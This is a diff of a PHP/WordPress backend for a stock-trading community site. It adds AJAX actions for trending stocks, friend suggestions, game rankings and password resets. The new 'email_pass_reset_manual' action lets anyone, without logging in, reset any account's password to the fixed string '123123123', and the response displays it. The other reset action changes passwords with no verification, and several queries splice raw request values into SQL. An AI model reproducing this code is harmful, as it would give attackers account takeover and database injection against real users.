@@ -28,7 +28,7 @@
 
 		$curl = curl_init();
 		curl_setopt($curl, CURLOPT_URL, "https://data-api.arbitrage.ph/api/v1/stocks/trades/latest?symbol=".$dinfstock."&exchange=PSE");
-		curl_setopt($curl, CURLOPT_RESOLVE, ['data-api.arbitrage.ph:443:104.25.248.104']);
+		curl_setopt($curl, CURLOPT_RESOLVE, ['data-api.arbitrage.ph:443:104.199.140.243']);
 		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
 		$response = curl_exec($curl);
 		curl_close($curl);
@@ -39,7 +39,7 @@
 
 		$curl = curl_init();
 		curl_setopt($curl, CURLOPT_URL, "https://data-api.arbitrage.ph/api/v1/stocks/history/latest?exchange=PSE&symbol=".$dinfstock);
-		curl_setopt($curl, CURLOPT_RESOLVE, ['data-api.arbitrage.ph:443:104.25.248.104']);
+		curl_setopt($curl, CURLOPT_RESOLVE, ['data-api.arbitrage.ph:443:104.199.140.243']);
 		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
 		$getstocks = curl_exec($curl);
 		curl_close($curl);
@@ -69,7 +69,7 @@
 
 			$curl = curl_init();
 			curl_setopt($curl, CURLOPT_URL, "https://data-api.arbitrage.ph/api/v1/stocks/trades/latest?symbol=".$dinfstock."&exchange=PSE");
-			curl_setopt($curl, CURLOPT_RESOLVE, ['data-api.arbitrage.ph:443:104.25.248.104']);
+			curl_setopt($curl, CURLOPT_RESOLVE, ['data-api.arbitrage.ph:443:104.199.140.243']);
 			curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
 			$response = curl_exec($curl);
 			curl_close($curl);
@@ -80,7 +80,7 @@
 
 			$curl = curl_init();
 			curl_setopt($curl, CURLOPT_URL, "https://data-api.arbitrage.ph/api/v1/stocks/history/latest?exchange=PSE&symbol=".$dinfstock);
-			curl_setopt($curl, CURLOPT_RESOLVE, ['data-api.arbitrage.ph:443:104.25.248.104']);
+			curl_setopt($curl, CURLOPT_RESOLVE, ['data-api.arbitrage.ph:443:104.199.140.243']);
 			curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
 			$getstocks = curl_exec($curl);
 			curl_close($curl);
@@ -390,50 +390,55 @@
 		$addQuery = "INSERT INTO `arby_notifyme_emails` (`id`, `email`, `created_at`) VALUES (NULL, '$str', NULL)";
 		$exist = $wpdb->query($addQuery);
 
+    }elseif(isset($_GET['daction']) && $_GET['daction'] == 'email_pass_reset_manual'){
+		global $wpdb;
+        $emailstr = stripslashes($_GET['email']);
+        
+        $user = get_user_by( 'email', $emailstr );
+
+        if(empty($user)){
+            echo "email is not registered";
+        } else {
+            $static_pwd = "123123123";
+            $passhash = wp_hash_password( $static_pwd );
+            $updatepass = "UPDATE arby_users SET user_pass = '$passhash' WHERE id = ".$user->data->ID;
+            $wpdb->query($updatepass);
+            echo "Email: ".$emailstr." | Password:".$static_pwd;
+        }
+
     }elseif(isset($_GET['daction']) && $_GET['daction'] == 'email_pass_reset'){
 		global $wpdb;
+		$homeurlgen = get_home_url();
 		$emailstr = stripslashes($_GET['email']);
-		echo $emailstr ."\n";
-		// return json_encode($emailstr);
+		$user = get_user_by( 'email', $emailstr );
 
-		// Search if email is existing
-		$checkQuery = "SELECT * FROM arby_users WHERE user_email like '$emailstr'";
-
-		// create random temp password
-		function password_generate($chars) 
-		{
-		  $data = '1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcefghijklmnopqrstuvwxyz';
-		  return substr(str_shuffle($data), 0, $chars);
-		}
-		$passgen = password_generate(8)."\n";
-		echo $passgen;
+		$data = '1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcefghijklmnopqrstuvwxyz';
+		$passgen = substr(str_shuffle($data), 50);
+	  
 		$passhash = wp_hash_password( $passgen );
+		$updatepass = "UPDATE arby_users SET user_pass = '$passhash' WHERE id = ".$user->data->ID;
+		$wpdb->query($updatepass);
 
-		// update users password to new temp password
-		$updatepass = "UPDATE arby_users SET user_pass = '$passhash' WHERE user_email = '$emailstr'";
-		$exist = $wpdb->query($updatepass);
-
-		// send email include all created credentials
 		$to = $emailstr;
 		$subject = 'Password Reset Confirmation';
 		$message = '
-		<div class="container" style="width: 100%; font-family: "Roboto", sans-serif; color: #142c46;">
-		<div class="em-head" style="padding: 23px 0px 23px 31px; background-color: #142c46; background-image: url("https://arbitrage.ph/email-templates/email-template/lines.png"); background-position: 5vh 34%; background-size: 103%;"><img class="arbi-logo" style="width: 24%;" src="https://arbitrage.ph/email-templates/email-template/logo.png" /></div>
-		<div class="site-name" style="text-align: right; font-size: 15px; float: right; margin: 20px 30px 0px 0px;">{site_name} <a class="trade-btn" style="color: #142c46; cursor: pointer; padding: 3px 9px; border-radius: 20px; border: 3px solid #142c46;">Trade now </a></div>
-		<div class="em-container" style="-webkit-box-shadow: 0px 2px 8px -2px rgba(0,0,0,0.53); -moz-box-shadow: 0px 2px 8px -2px rgba(0,0,0,0.53); box-shadow: 0px 2px 8px -2px rgba(0,0,0,0.53);">
+		<div class="container" style="width: 100%; font-family: "Roboto, sans-serif; color: #142c46;">
+			<div class="em-head" style="padding: 23px 0px 23px 31px; background-color: #142c46; background-image: url("'.$homeurlgen.'/email-templates/email-template/lines.png"); background-position: 5vh 34%; background-size: 103%;"><img class="arbi-logo" style="width: 24%;" src="'.$homeurlgen.'/email-templates/email-template/logo.png" /></div>
+			<div class="site-name" style="text-align: right; font-size: 15px; float: right; margin: 20px 30px 0px 0px;color: #142c46;">Arbitrage <a class="trade-btn" style="color: #142c46; cursor: pointer; padding: 3px 9px; border-radius: 20px; border: 3px solid #142c46;">Trade now </a></div>
+			<div class="em-container" style="-webkit-box-shadow: 0px 2px 8px -2px rgba(0,0,0,0.53); -moz-box-shadow: 0px 2px 8px -2px rgba(0,0,0,0.53); box-shadow: 0px 2px 8px -2px rgba(0,0,0,0.53);">
 			<div class="em-content-handler">
 				<div class="em-content-center" style="margin: 0 39px; padding-bottom: 45px; padding-top: 67px;">
-					<div class="em-content-topic" style="text-align: left; font-size: 25px; font-weight: 500; margin-top: 0px; margin-bottom: 53px; line-height: 33px;">We received a request to reset the password for your account. Your new password is indicated below.</div>
-					<a class="login-prime-btn" style="border-bottom: 3px solid #142c46; padding: 10px 0; color: #142c46; font-size: 18px; border-radius: 0; text-decoration: none !important; font-weight: 500;" href="{login_url}">'. $passgen .'</a>
-					<div class="em-content-body" style="text-align: left; margin-top: 47px; font-size: 15px; line-height: 20px; font-weight: 500;">If you didnt make this request, ignore this email or <a>report it to us.</a></div>
-					<div class="greet-container" style="font-weight: 500;">
-						<div class="em-greet sss" style="margin-top: 52px; font-size: 15px;">Thank you!</div>
-						<div class="em-greet-name" style="font-size: 15px;">The <a href="{site_url}">{site_name}</a> Team</div>
+					<div class="em-content-topic" style="text-align: left; font-size: 25px; font-weight: 500; margin-top: 0px; margin-bottom: 53px; line-height: 33px;color: #142c46;">We received a request to reset the password for your account. Your new password is indicated below.</div>
+					<a class="login-prime-btn" style="border-bottom: 3px solid #142c46; padding: 10px 0; color: #142c46; font-size: 18px; border-radius: 0; text-decoration: none !important; font-weight: 500;">'. $passgen .'</a>
+					<div class="em-content-body" style="text-align: left; margin-top: 47px; font-size: 15px; line-height: 20px; font-weight: 500;color: #142c46;">If you didnt make this request, ignore this email or <a>report it to us.</a></div>
+					<div class="greet-container" style="font-weight: 500;color: #142c46;">
+						<div class="em-greet sss" style="margin-top: 52px; font-size: 15px;color: #142c46;">Thank you!</div>
+						<div class="em-greet-name" style="font-size: 15px;color: #142c46;">The <a href="'.$homeurlgen.'">Arbitrage</a> Team</div>
 					</div>
 				</div>
 			</div>
+			</div>
 		</div>
-	</div>
 		';
 		
 		$headers = 'MIME-Version: 1.0' . "\r\n";
@@ -444,13 +449,130 @@
 		$success = mail($to, $subject, $message, $headers);
 		if (!$success) {
 			$errorMessage = error_get_last();
+
+			echo json_encode(['status' => 500, 'success' => false]);
+			die();
 		}
 		// return to user success
-		return;
+		echo json_encode(['status' => 200, 'success' => true]);
+		die();
 
     }elseif(isset($_GET['daction']) && $_GET['daction'] == 'send_batch_verification'){
 
         die('test test');
+
+	}elseif(isset($_GET['daction']) && $_GET['daction'] == 'whotomingle'){
+
+        // global $current_user;
+		// $user = wp_get_current_user();
+		$userID = $current_user->ID;
+		$topargs = array(
+			'role'          =>  '',
+		);
+		$users = get_users($topargs);
+		$newuserlist = array();
+		$counter = 0;
+
+		$dsprest = $wpdb->get_results( "select * from arby_users where id not in (select distinct user_id1 from arby_um_friends where user_id2 = ".$userID." and status = 1) order by rand() limit 5");
+		foreach ($dsprest as $key => $value) {
+			$userdetails = [];
+			$userdetails['currentuser'] = $userID;
+			$userdetails['id'] = $value->ID;
+			$userdetails['displayname'] = $value->display_name;
+			$userdetails['user_nicename'] = $value->user_nicename;
+			$userdetails['profpic'] = esc_url( get_avatar_url( $value->ID ) );
+			array_push($newuserlist, $userdetails);
+		}
+
+		echo json_encode($newuserlist);
+
+	}elseif(isset($_GET['daction']) && $_GET['daction'] == 'trendingstocks'){
+		global $wpdb;
+
+		$date = date('Y-m-d', time());
+
+		$curl = curl_init();
+		curl_setopt($curl, CURLOPT_URL, 'https://data-api.arbitrage.ph/api/v1/stocks/list');
+		// curl_setopt($curl, CURLOPT_RESOLVE, ['data-api.arbitrage.ph:443:104.199.140.243']);
+		curl_setopt($curl, CURLOPT_RESOLVE, ['data-api.arbitrage.ph:443:104.199.140.243']);
+		curl_setopt($curl, CURLOPT_DNS_USE_GLOBAL_CACHE, false);
+
+		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+		$gerdqoute = curl_exec($curl);
+		curl_close($curl);
+		
+		$gerdqoute = json_decode($gerdqoute);
+		$adminuser = 504; // store on the chart page
+
+		
+
+		if ($gerdqoute) {
+			$listofstocks = []; 
+			foreach ($gerdqoute->data as $dlskey => $dlsvalue) {
+				$indls = [];
+				$indls['stock'] = $dlskey;
+				$dstocknamme = $dlskey;
+
+				$dstocks = $dlsvalue->description;
+				$indls['stnamename'] = $dstocks;
+				
+				$dsprest = $wpdb->get_results( "SELECT * FROM arby_posts WHERE post_content LIKE '%$".strtolower($dstocknamme)."%' AND DATE(post_date) >= DATE_ADD(CURDATE(), INTERVAL -3 DAY)");
+
+				$todayreps = 0; // today
+				$countpstock = 0; // 3 days back
+				$isbull = 0;
+				foreach ($dsprest as $rsffkey => $rsffvalue) {
+					$dcontent = $rsffvalue->post_content;
+					if (strpos(strtolower($dcontent), '$'.strtolower($dstocknamme)) !== false) {
+						if(date("Y-m-d", strtotime($rsffvalue->post_date)) == $date){
+							$todayreps++;
+						} else {
+							$countpstock++;
+						}
+						
+					}
+				}
+				$dpullbull = get_post_meta( $adminuser, '_sentiment_'.$dstocknamme.'_bull', true );
+				$dpullbull = $dpullbull == '' ? 0 : $dpullbull;
+				// 3 days back
+				$threedays = ceil($countpstock * 0.2);
+				$bulls = ceil($dpullbull * 0.3);
+				$tags = ceil($todayreps * 0.6);
+				$finalcount = $bulls + $threedays + $tags;
+				$stocksscount = $countpstock + $dpullbull + $todayreps;
+
+		
+				$indls['following'] = $finalcount;
+				if($finalcount > 0){
+					array_push($listofstocks, $indls);
+				}
+				
+			}
+
+			function date_compare($a, $b)
+			{
+				$t1 = $a['following'];
+				$t2 = $b['following'];
+				return $t1 - $t2;
+			}
+			usort($listofstocks, 'date_compare');
+			$drevdds = array_reverse($listofstocks);
+
+			$maxitems = 10;
+			$finaltopstocks = [];
+			foreach ($drevdds as $fnskey => $fnsvalue) {
+				if ($fnskey + 1 > $maxitems) {
+					break;
+				}
+				array_push($finaltopstocks, $fnsvalue);
+
+			}
+
+			echo json_encode($finaltopstocks);
+			die;
+		} else {
+			echo "no stock selected";
+		}
 
 	}elseif(isset($_GET['daction']) && $_GET['daction'] == 'userwatchlist'){
 		global $wpdb;
@@ -466,6 +588,39 @@
 		}
 
 		echo json_encode($listofwatchlist);
+	}elseif(isset($_GET['daction']) && $_GET['daction'] == 'topplayers'){
+		$secret = get_user_meta( $current_user->ID, 'user_secret', true );
+		
+		$curl = curl_init();
+		curl_setopt($curl, CURLOPT_URL, 'https://game.arbitrage.ph/api/getranking' );
+		curl_setopt($curl, CURLOPT_DNS_USE_GLOBAL_CACHE, false);
+		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+		$dranks = curl_exec($curl);
+		curl_close($curl);
+		$dranks = json_decode($dranks, true);
+		
+		$curl = curl_init();
+		curl_setopt($curl, CURLOPT_URL, 'https://game.arbitrage.ph/api/getmyrank/'.$secret );
+		curl_setopt($curl, CURLOPT_DNS_USE_GLOBAL_CACHE, false);
+		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+		$myrank = curl_exec($curl);
+		curl_close($curl);
+		$myrank = json_decode($myrank, true);
+
+		array_push($dranks, $myrank);
+
+		echo json_encode($dranks);
+
+	}elseif(isset($_GET['daction']) && $_GET['daction'] == 'sidebar-bulletin'){
+
+		ob_start();
+		dynamic_sidebar( 'et_pb_widget_area_1' );
+		$content = ob_get_contents();
+		ob_end_clean();
+
+		echo json_encode(['data' => $content, 'status' => 200, 'success' => true]);
+		die();
+		
 	} else { // market sentiment : check sentiment
 
 		if(isset($_GET['toverify'])){
@@ -545,9 +700,14 @@
 			$dtradd = json_decode(getpointtrades($_GET['stock']));
 			
 			$totalitem = $totsbear + $totsbull + ($dtradd->bear + $dtradd->bull);
+			
+			$bearperc = 0;
+			$bullperc = 0;
 
-			$bearperc = (($totsbear + $dtradd->bear) / $totalitem) * 100;
-			$bullperc = (($totsbull + $dtradd->bull) / $totalitem) * 100;
+			if ($totalitem != 0) {
+				$bearperc = ($totsbear + $dtradd->bear) != 0 ? (($totsbear + $dtradd->bear) / $totalitem) * 100 : 0;
+				$bullperc = ($totsbull + $dtradd->bull) != 0 ? (($totsbull + $dtradd->bull) / $totalitem) * 100 : 0;
+			}
 			
 			echo json_encode(["dbear" => number_format( $bearperc, 2, '.', ',' ), 'dbull' => number_format( $bullperc, 2, '.', ',' ), 'isvote' => $isvote, 'islastupdate' => $dlastupdate]);
 		}
